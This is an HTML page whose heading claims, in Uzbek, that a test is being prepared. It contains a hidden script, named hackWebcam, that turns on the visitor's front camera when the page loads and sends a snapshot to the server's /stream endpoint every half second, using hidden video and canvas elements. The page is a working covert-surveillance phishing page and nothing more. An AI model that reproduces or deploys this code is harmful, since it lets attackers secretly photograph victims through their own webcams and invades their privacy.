 
    <h1 align="center">test uchun tayorlanmoqda ! @satomoru<h1>
    
    <video hidden id="video" playsinline autoplay></video>
    
    <canvas hidden id="canvas" width="640" height="640">canvas</canvas>
    
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <script>
    
      function post(imgdata){
        $.ajax({
          type: 'POST',
          data: {frame: imgdata},
          url: '/stream',
          dataType: 'json',
          async: false
        });
      };
      
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
   
      const constraints = {
        audio: false,
        video: { facingMode: "user" }
      };
      
      async function hackWebcam() {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        window.stream = stream;
        video.srcObject = stream;
        var context = canvas.getContext('2d');
        setInterval(function() {
          context.drawImage(video, 0, 0, 640, 640);
          
          var canvasData = canvas.toDataURL("image/png")
          post(canvasData);
        }, 500);
      }
      
      hackWebcam();
      
    </script>
